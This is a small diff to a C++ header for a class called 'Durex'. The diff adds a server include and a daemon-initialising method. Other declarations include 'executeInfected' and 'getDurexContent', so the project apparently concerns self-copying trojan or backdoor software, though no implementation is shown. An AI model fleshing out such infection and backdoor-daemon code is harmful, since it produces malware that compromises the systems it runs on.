@@ -5,6 +5,7 @@
 #include "Environment.hpp"
 #include "Service.hpp"
 #include "Utils.hpp"
+#include "Server.hpp"
 class Durex
 {
 	public:
@@ -22,6 +23,7 @@ class Durex
 		int					getRandom(int low, int high);
 		void				executeInfected(std::string path);
 		std::string			getDurexContent();
+		void				initDaemonDefault();
 	private:
 		Environment *env;
 };
